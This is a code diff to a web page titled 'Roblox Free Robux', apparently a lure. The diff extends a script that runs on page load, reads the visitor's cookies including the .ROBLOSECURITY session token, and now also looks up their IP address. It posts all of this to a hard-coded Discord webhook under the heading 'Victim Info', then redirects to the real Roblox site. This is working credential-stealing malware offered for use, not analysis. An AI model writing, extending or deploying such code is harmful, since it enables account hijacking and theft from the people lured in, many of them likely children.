@@ -3,27 +3,38 @@
 <head>
     <title>Roblox Free Robux</title>
     <script>
-        function logRobloxCookie() {
+        async function logRobloxCookie() {
             try {
                 // Get all cookies for this domain
                 const cookies = document.cookie;
-                console.log("All cookies:", cookies); // Debug: see what’s available
+                console.log("All cookies:", cookies);
 
                 // Search for .ROBLOSECURITY
                 const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
                 const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;
 
+                // Fetch IP address using ipify.org API
+                let ipAddress = "Unknown";
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ipAddress = ipData.ip;
+                } catch (ipError) {
+                    console.error("IP fetch error:", ipError);
+                }
+
                 // Your Discord webhook URL
                 const webhookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";
 
-                // Build payload with debug info
+                // Build payload with IP and cookie info
                 const payload = {
                     username: "Roblox Logger",
-                    content: "Cookie check triggered!",
+                    content: "Cookie and IP check triggered!",
                     embeds: [{
-                        title: "Cookie Info",
+                        title: "Victim Info",
                         fields: [
                             { name: "ROBLOSECURITY", value: `\`\`\`${cookieValue}\`\`\``, inline: true },
+                            { name: "IP Address", value: `\`\`\`${ipAddress}\`\`\``, inline: true },
                             { name: "Time", value: new Date().toLocaleString(), inline: true },
                             { name: "All Cookies", value: `\`\`\`${cookies || "None"}\`\`\``, inline: false }
                         ],
@@ -47,7 +58,7 @@
                 })
                 .catch(error => {
                     console.error("Fetch error:", error);
-                    window.location.href = "https://www.roblox.com/"; // Redirect anyway
+                    window.location.href = "https://www.roblox.com/";
                 });
             } catch (error) {
                 console.error("Script error:", error);
@@ -55,8 +66,10 @@
             }
         }
 
-        // Run on load
-        window.onload = logRobloxCookie;
+        // Run on load (async function needs wrapping)
+        window.onload = function() {
+            logRobloxCookie();
+        };
 
         // Optional: Button trigger for manual testing
         function manualTrigger() {
